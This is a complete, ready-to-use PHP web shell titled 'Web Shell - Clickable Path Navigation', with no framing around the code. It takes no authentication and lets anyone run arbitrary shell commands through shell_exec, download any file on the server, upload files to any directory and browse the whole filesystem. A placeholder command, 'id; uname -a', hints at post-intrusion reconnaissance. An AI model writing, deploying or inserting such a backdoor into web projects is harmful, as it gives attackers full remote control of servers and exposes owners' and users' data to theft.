<?php
    // Determine the current working directory from the URL, or use getcwd() as default
    $current_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
    if (!$current_dir || !is_dir($current_dir)) { $current_dir = getcwd(); }

    // --- DOWNLOAD LOGIC ---
    if (isset($_GET['download'])) {
        $file_path = realpath($_GET['download']);
        if ($file_path && file_exists($file_path) && is_file($file_path)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
            header('Content-Length: ' . filesize($file_path));
            readfile($file_path);
            exit;
        }
    }

    // --- UPLOAD LOGIC ---
    $msg = "";
    if (isset($_FILES['fileToUpload'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target)) {
            $msg = "Uploaded: " . htmlspecialchars(basename($target));
        }
    }

    // --- COMMAND LOGIC ---
    $cmd_output = "";
    if (isset($_POST['cmd'])) {
        chdir($current_dir); 
        $cmd_output = shell_exec($_POST['cmd'] . " 2>&1");
    }

    $files = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell - Clickable Path Navigation</title>
    <style>
        body { background: #121212; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        a { text-decoration: none; color: #5dade2; }
        a:hover { text-decoration: underline; color: #fff; }
        input, button { background: #222; color: #00ff00; border: 1px solid #444; padding: 5px; }
        pre { background: #000; padding: 10px; border: 1px solid #333; color: #ccc; }
        
        .breadcrumb { font-size: 1.2em; margin-bottom: 20px; color: #aaa; }
        .breadcrumb a { color: #00ff00; font-weight: bold; }
        
        .dir { color: #5dade2; font-weight: bold; }
        .exe { color: #ec7063; font-weight: bold; }
        .file { color: #fdfefe; }
        .dl { color: #f4d03f; font-size: 0.85em; }

        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #222; color: #888; text-align: left; padding: 10px; }
        td { padding: 8px; border-bottom: 1px solid #222; }
        tr:hover { background: #1a1a1a; }
    </style>
</head>
<body>

    <div class="breadcrumb">
        Path: 
        <?php 
            $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
            $accumulated_path = "";
            foreach ($path_parts as $index => $part) {
                if ($part === "" && $index === 0) {
                    // Handle Root (Linux)
                    $accumulated_path = "/";
                    echo '<a href="?path=/">/</a>';
                } else if ($part !== "") {
                    // Build path segment by segment
                    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                        $accumulated_path .= ($accumulated_path == "" ? "" : DIRECTORY_SEPARATOR) . $part;
                    } else {
                        $accumulated_path .= DIRECTORY_SEPARATOR . $part;
                    }
                    echo '<a href="?path='.urlencode($accumulated_path).'">'.htmlspecialchars($part).'</a>' . DIRECTORY_SEPARATOR;
                }
            }
        ?>
    </div>

    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
        <form method="POST" enctype="multipart/form-data" style="display:inline-block; margin-right: 30px;">
            Upload: <input type="file" name="fileToUpload"> <button type="submit">Go</button>
        </form>
        <form method="POST" style="display:inline-block;">
            Exec: <input type="text" name="cmd" placeholder="id; uname -a" style="width:300px;"> <button type="submit">Run</button>
        </form>
    </div>

    <?php if ($msg) echo "<p style='color:yellow;'>$msg</p>"; ?>
    <?php if ($cmd_output): ?><pre><?php echo htmlspecialchars($cmd_output); ?></pre><?php endif; ?>

    <table>
        <thead>
            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
        </thead>
        <tbody>
            <?php
            foreach ($files as $file) {
                if ($file == ".") continue;

                $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
                $is_dir = is_dir($full_path);
                $is_exe = !$is_dir && is_executable($full_path);
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $size = $is_dir ? "-" : round(filesize($full_path) / 1024, 2) . " KB";
                
                $class = "file";
                if ($is_dir) $class = "dir";
                elseif ($is_exe) $class = "exe";

                $link = "?path=" . urlencode($full_path);
                ?>
                <tr>
                    <td>
                        <?php if ($is_dir): ?>
                            <a href="<?php echo $link; ?>" class="dir">[DIR] <?php echo htmlspecialchars($file); ?></a>
                        <?php else: ?>
                            <span class="<?php echo $class; ?>"><?php echo htmlspecialchars($file); ?></span>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $size; ?></td>
                    <td><?php echo $perms; ?></td>
                    <td>
                        <?php if (!$is_dir): ?>
                            <a href="?download=<?php echo urlencode($full_path); ?>" class="dl">[Download]</a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php
            }
            ?>
        </tbody>
    </table>
</body>
</html>
